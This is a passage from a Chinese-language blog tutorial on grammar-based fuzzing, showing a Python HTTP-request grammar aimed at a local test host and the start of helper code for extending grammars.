string">"&lt;id&gt;=&lt;nat&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者类似HTTP协议的（但是这个不是为上述Fuzz准备的，只是拿来做个参考）：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"&lt;A&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"&lt;START_LINE&gt;"</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;HEADERS&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;BODY&gt;"</span><span class="token punctuation">,</span> <span class="token string">"\r\n\r\n"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;START_LINE&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"&lt;METHOD&gt;"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"&lt;URI&gt;"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"&lt;VERSION&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;METHOD&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"HEAD"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"PUT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"DELETE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"CONNECT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"OPTIONS"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"TRACE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"PATCH"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"ACL"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"BASELINE-CONTROL"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"BIND"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"CHECKIN"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"CHECKOUT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"COPY"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"LABEL"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"LINK"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"LOCK"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MERGE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MKACTIVITY"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MKCALENDAR"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MKCOL"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MKREDIRECTREF"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MKWORKSPACE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"MOVE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"ORDERPATCH"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"PRI"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"PROPFIND"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"PROPPATCH"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"REBIND"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"REPORT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"SEARCH"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"UNBIND"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"UNCHECKOUT"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"UNLINK"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"UNLOCK"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"UPDATE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"UPDATEREDIRECTREF"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"VERSION-CONTROL"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;URI&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"&lt;SCHEME&gt;"</span> <span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"&lt;HIER&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;QUERY&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;FRAGMENT&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;SCHEME&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"https"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"shttp"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"dav"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"about"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"attachment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"cid"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"ftp"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"ssh"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"sip"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;HIER&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"//"</span><span class="token punctuation">,</span> <span class="token string">"&lt;AUTHORITY&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;PATH&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;AUTHORITY&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"&lt;USERINFO&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;HOST&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;PATH&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"&lt;DIR&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;DIR&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"&lt;DIR&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;USERINFO&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">,</span> <span class="token string">"@"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;HOST&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"127.0.0.1:8080"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;QUERY&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"&lt;CHAR&gt;"</span> <span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;FRAGMENT&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;VERSION&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"HTTP/0.9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"HTTP/1.0"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"HTTP/1.1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"HTTP/2.0"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"HTTP/3.0"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;HEADERS&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;HEADER&gt;"</span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;HEADERS&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;HEADER&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"&lt;HEADER_FIELD&gt;"</span><span class="token punctuation">,</span> <span class="token string">": "</span><span class="token punctuation">,</span> <span class="token string">"&lt;ANY&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;HEADER_FIELD&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"A-IM"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Accept"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Accept-Charset"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Accept-Datetime"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Accept-Encoding"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Accept-Language"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Access-Control-Request-Method"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Access-Control-Request-Headers"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Authorization"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Cache-Control"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Connection"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Content-Encoding"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Content-Length"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Content-MD5"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Cookie"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Date"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Expect"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Forwarded"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"From"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Host"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"HTTP2-Settings"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"If-Match"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"If-Modified-Since"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"If-None-Match"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"If-Range"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"If-Unmodified-Since"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Max-Forwards"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Pragma"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Proxy-Authorization"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Range"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Referer"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"TE"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Trailer"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Transfer-Encoding"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"User-Agent"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Upgrade"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Via"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Warning"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;BODY&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;ANY&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;DATE&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;HOST&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"&lt;URI&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;DATE&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"Sat, 29 Oct 1994 19:43:31 GMT"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"&lt;CHAR&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"0"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"2"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"3"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"4"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"5"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"7"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"8"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"c"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"d"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"e"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"f"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"g"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"i"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"j"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"k"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"l"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"o"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"q"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"r"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"s"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"t"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"u"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"v"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"w"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"x"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"y"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"z"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"A"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"B"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"C"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"D"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"E"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"F"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"G"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"H"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"I"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"J"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"K"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"L"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"M"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"N"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"O"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"P"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Q"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"R"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"S"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"T"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"U"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"V"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"W"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"X"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Y"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"Z"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到此，我们理解了Grammar对于Fuzzing的重要性，一个杰出的Grammar能够有效的生成大量合法输入，不过这只是从输入组成（句法）来看，这毕竟是一个庞大的范围，虽然有时候满足程序的输入格式，但是未必真的对Fuzzing起作用，这种情况非常常见。再一次以编译器为例子，你的程序在满足语言语法的同时更应该具备正确的语义。但是语义很难再以Grammar的形式表达。以URL生成Grammar为例，简单通过Grammar很难定义端口的范围。面对这样的问题，最简单的解决办法其实就是在Fuzz里面而不是在Grammar里面进行限制。以URL Grammar为例，通过Grammar生成的URL在真正的被作为Input给予目标之前，应该在Fuzz系统里面经过URL“合法性”判断，这里的判断可以由作者根据自己的需求来进行限制。</p><h3 id="Grammar-Toolbox"><a href="#Grammar-Toolbox" class="headerlink" title="Grammar Toolbox"></a>Grammar Toolbox</h3><p>​  在Fuzzing项目中对于Grammar的需求并不是一成不变的，因此Grammar的一大需求就是具备可扩展性。以一个简单的Gramar为例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simple_nonterminal_grammar<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;nonterminal&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;nonterminal&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;left-angle&gt;&lt;identifier&gt;&lt;right-angle&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;left-angle&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&lt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;right-angle&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;identifier&gt;"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span>  <span class="token comment"># for now</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有时候我们希望拓展其功能，但是不希望原来的Grammar受到影响（类比编程中的继承）,就是一个很简单的如下操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">nonterminal_grammar <span class="token operator">=</span> copy<span class="token punctuation">.</span>deepcopy<span class="token punctuation">(</span>simple_nonterminal_grammar<span class="token punctuation">)</span>nonterminal_grammar<span class="token punctuation">[</span><span class="token string">"&lt;identifier&gt;"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"&lt;idchar&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;identifier&gt;&lt;idchar&gt;"</span><span class="token punctuation">]</span>nonterminal_grammar<span class="token punctuation">[</span><span class="token string">"&lt;idchar&gt;"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">]</span>  <span class="token comment"># for now</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>总结为一个函数如下，非常简单就不多解释：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">set_opts</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span> symbol<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> expansion<span class="token punctuation">:</span> Expansion<span class="token punctuation">,</span>              opts<span class="token punctuation">:</span> Option <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Set the options of the given expansion of grammar[symbol] to opts"""</span>    expansions <span class="token operator">=</span> grammar<span class="token punctuation">[</span>symbol<span class="token punctuation">]</span>    <span class="token keyword">for</span> i<span class="token punctuation">,</span> exp <span class="token 